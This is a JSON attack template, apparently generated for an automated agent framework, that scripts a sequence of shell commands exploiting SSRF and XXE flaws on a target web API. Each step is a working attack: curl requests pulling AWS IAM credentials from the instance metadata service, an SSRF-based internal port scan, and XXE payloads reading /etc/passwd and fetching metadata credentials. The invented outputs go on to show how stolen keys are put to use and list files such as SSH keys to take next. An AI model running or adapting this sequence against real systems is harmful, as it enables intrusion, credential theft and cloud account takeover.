{
  "name": "ssrf_xxe_attacks",
  "description": "Server-Side Request Forgery (SSRF) and XML External Entity (XXE) attacks",
  "pattern": "ssrf|server.*side.*request|xxe|xml.*external.*entity",
  "parameters": [
    "target_url",
    "injection_point",
    "attack_type"
  ],
  "sequence": [
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "curl",
        "args": [
          "-X",
          "POST",
          "http://target.com/api/fetch",
          "-H",
          "Content-Type: application/json",
          "-d",
          "{\"url\":\"http://127.0.0.1:80\"}"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "{\n  \"status\": \"success\",\n  \"content\": \"<!DOCTYPE html>\\n<html>\\n<head><title>Internal Admin Panel</title></head>\\n<body>\\n  <h1>Internal Administration</h1>\\n  <p>Only accessible from localhost</p>\\n  <ul>\\n    <li><a href='/admin/users'>User Management</a></li>\\n    <li><a href='/admin/config'>System Configuration</a></li>\\n    <li><a href='/admin/logs'>View Logs</a></li>\\n    <li><a href='/admin/backup'>Database Backup</a></li>\\n  </ul>\\n</body>\\n</html>\",\n  \"response_code\": 200\n}\n\nSSRF vulnerability confirmed!\n  Endpoint: /api/fetch\n  Parameter: url (accepts user input)\n  Vulnerability: Server fetches arbitrary URLs\n  \nInternal service accessed:\n  Target: http://127.0.0.1:80 (localhost)\n  Response: Internal admin panel HTML\n  Access: Bypassed localhost-only restriction\n  \nInternal endpoints discovered:\n  - /admin/users\n  - /admin/config\n  - /admin/logs\n  - /admin/backup\n  \nSSRF attack capabilities:\n  1. Access internal services (localhost-only)\n  2. Port scanning internal network\n  3. Access cloud metadata (AWS, Azure, GCP)\n  4. Bypass firewall restrictions\n  5. Access internal APIs"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "curl",
        "args": [
          "-X",
          "POST",
          "http://target.com/api/fetch",
          "-H",
          "Content-Type: application/json",
          "-d",
          "{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "{\n  \"status\": \"success\",\n  \"content\": \"web-server-role\\nbackup-service-role\\nadmin-access-role\",\n  \"response_code\": 200\n}\n\nAWS metadata service accessed!\n  URL: http://169.254.169.254/latest/meta-data/\n  Service: AWS EC2 Instance Metadata Service (IMDSv1)\n  \nIAM roles discovered:\n  - web-server-role\n  - backup-service-role\n  - admin-access-role\n  \nNext: Extract credentials for each role\n  curl -X POST http://target.com/api/fetch \\\n    -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/web-server-role\"}'"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "curl",
        "args": [
          "-X",
          "POST",
          "http://target.com/api/fetch",
          "-H",
          "Content-Type: application/json",
          "-d",
          "{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-access-role\"}"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "{\n  \"status\": \"success\",\n  \"content\": \"{\\n  \\\"Code\\\" : \\\"Success\\\",\\n  \\\"LastUpdated\\\" : \\\"2024-01-15T14:30:00Z\\\",\\n  \\\"Type\\\" : \\\"AWS-HMAC\\\",\\n  \\\"AccessKeyId\\\" : \\\"ASIAQWERTYUIOPASDFGH\\\",\\n  \\\"SecretAccessKey\\\" : \\\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\\\",\\n  \\\"Token\\\" : \\\"AQoDYXdzEJr...<very long token>...zU3Ag==\\\",\\n  \\\"Expiration\\\" : \\\"2024-01-15T20:30:00Z\\\"\\n}\",\n  \"response_code\": 200\n}\n\nAWS credentials stolen via SSRF!\n  Role: admin-access-role\n  AccessKeyId: ASIAQWERTYUIOPASDFGH\n  SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n  Token: AQoDYXdzEJr...<truncated>...zU3Ag==\n  Expiration: 2024-01-15 20:30:00 (6 hours)\n  \nCredentials extracted!\n  Configure AWS CLI:\n    export AWS_ACCESS_KEY_ID=ASIAQWERTYUIOPASDFGH\n    export AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n    export AWS_SESSION_TOKEN=AQoDYXdzEJr...zU3Ag==\n  \nTest access:\n    aws sts get-caller-identity\n    aws s3 ls\n    aws ec2 describe-instances\n  \nPotential impact:\n  - Full AWS account access\n  - Data exfiltration from S3\n  - EC2 instance control\n  - Privilege escalation"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "for port in 22 80 443 3306 5432 6379 8080 9000; do curl -X POST http://target.com/api/fetch -H 'Content-Type: application/json' -d '{\"url\":\"http://127.0.0.1:'$port'\"}' -s | grep -q 'success' && echo \"Port $port: OPEN\" || echo \"Port $port: CLOSED\"; done"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "Port 22: OPEN\nPort 80: OPEN\nPort 443: CLOSED\nPort 3306: OPEN\nPort 5432: CLOSED\nPort 6379: OPEN\nPort 8080: OPEN\nPort 9000: CLOSED\n\nInternal port scan via SSRF:\n  Target: 127.0.0.1 (localhost)\n  Method: SSRF-based port enumeration\n  \nOpen ports discovered:\n  - Port 22: SSH\n  - Port 80: HTTP (web server)\n  - Port 3306: MySQL database\n  - Port 6379: Redis (cache/session storage)\n  - Port 8080: Alternative HTTP (likely admin panel)\n  \nNext targets:\n  - MySQL (3306): Attempt default credentials\n    {\"url\":\"mysql://root:@127.0.0.1:3306/mysql\"}\n  \n  - Redis (6379): Attempt unauthenticated access\n    {\"url\":\"http://127.0.0.1:6379/\"}\n    Redis commands via HTTP (gopher protocol)\n  \n  - Admin panel (8080): Access internal admin interface\n    {\"url\":\"http://127.0.0.1:8080/admin\"}"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "cat > xxe_payload.xml << 'EOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n]>\n<user>\n  <name>&xxe;</name>\n  <email>test@test.com</email>\n</user>\nEOF\ncat xxe_payload.xml"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >\n]>\n<user>\n  <name>&xxe;</name>\n  <email>test@test.com</email>\n</user>\n\nXXE payload created:\n  Attack: XML External Entity injection\n  Target file: /etc/passwd\n  Entity: &xxe;\n  Method: Define external entity, reference in XML\n  \nXML structure:\n  DOCTYPE: Defines custom DTD (Document Type Definition)\n  ENTITY xxe: External entity pointing to file:///etc/passwd\n  Reference: &xxe; in <name> tag\n  \nWhen parsed:\n  XML parser resolves &xxe;\n  Reads /etc/passwd\n  Returns file content in response\n  \nSubmitting payload:\n  curl -X POST http://target.com/api/user/import \\\n    -H 'Content-Type: application/xml' \\\n    -d @xxe_payload.xml"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "curl",
        "args": [
          "-X",
          "POST",
          "http://target.com/api/user/import",
          "-H",
          "Content-Type: application/xml",
          "-d",
          "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><user><name>&xxe;</name><email>test@test.com</email></user>"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "{\n  \"status\": \"error\",\n  \"message\": \"Invalid user name\",\n  \"details\": \"Name contains invalid characters: root:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\\nmysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false\\nubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash\\nadmin:x:1001:1001:Admin User:/home/admin:/bin/bash\"\n}\n\nXXE successful - File read achieved!\n  File: /etc/passwd\n  Method: XML External Entity injection\n  Response: Error message contains file contents\n  \nUsers discovered:\n  - root (uid=0)\n  - www-data (uid=33, web server)\n  - mysql (uid=112)\n  - ubuntu (uid=1000, user account)\n  - admin (uid=1001, privileged user)\n  \nHigh-value targets for next XXE:\n  - /etc/shadow (password hashes)\n  - /var/www/html/config.php (database credentials)\n  - /home/admin/.ssh/id_rsa (SSH private key)\n  - /proc/self/environ (environment variables)\n  - /var/log/apache2/access.log (sensitive info in logs)"
      }
    },
    {
      "action": {
        "type": "system_command",
        "tool": "shell",
        "operation": "run",
        "command": "bash",
        "args": [
          "-c",
          "cat > xxe_ssrf.xml << 'EOF'\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE foo [\n  <!ELEMENT foo ANY >\n  <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/admin-access-role\" >\n]>\n<user>\n  <name>&xxe;</name>\n  <email>test@test.com</email>\n</user>\nEOF\ncurl -X POST http://target.com/api/user/import -H 'Content-Type: application/xml' -d @xxe_ssrf.xml"
        ]
      },
      "expected_output": {
        "type": "string",
        "example": "{\n  \"status\": \"error\",\n  \"message\": \"Invalid user name\",\n  \"details\": \"Name contains invalid characters: {\\n  \\\"Code\\\" : \\\"Success\\\",\\n  \\\"LastUpdated\\\" : \\\"2024-01-15T14:30:00Z\\\",\\n  \\\"Type\\\" : \\\"AWS-HMAC\\\",\\n  \\\"AccessKeyId\\\" : \\\"ASIAQWERTYUIOPASDFGH\\\",\\n  \\\"SecretAccessKey\\\" : \\\"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\\\",\\n  \\\"Token\\\" : \\\"AQoDYXdzEJr...<token>...zU3Ag==\\\",\\n  \\\"Expiration\\\" : \\\"2024-01-15T20:30:00Z\\\"\\n}\"\n}\n\nXXE + SSRF combination!\n  XXE: XML External Entity\n  SSRF: Server-Side Request Forgery\n  Target: AWS metadata service\n  \nAWS credentials stolen via XXE:\n  Method: XXE entity with http:// URL\n  URL: http://169.254.169.254/latest/meta-data/...\n  Result: AWS credentials in error message\n  \nCredentials extracted:\n  AccessKeyId: ASIAQWERTYUIOPASDFGH\n  SecretAccessKey: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n  Token: AQoDYXdzEJr...<token>...zU3Ag==\n  \nXXE advantages over direct SSRF:\n  - Different attack vector (XML parser vs HTTP client)\n  - May bypass SSRF filters\n  - Can access file:// and http:// protocols\n  - Often less monitored\n  \nOther XXE + SSRF targets:\n  - http://localhost:8080/admin\n  - http://127.0.0.1:3306/ (MySQL)\n  - http://127.0.0.1:6379/ (Redis)\n  - http://internal-api.local/secrets"
      }
    }
  ],
  "stats": {
    "uses": 0,
    "successes": 0,
    "failures": 0,
    "success_rate": 0.0
  },
  "created_by": "neural_mesh_v5.2_generator"
}
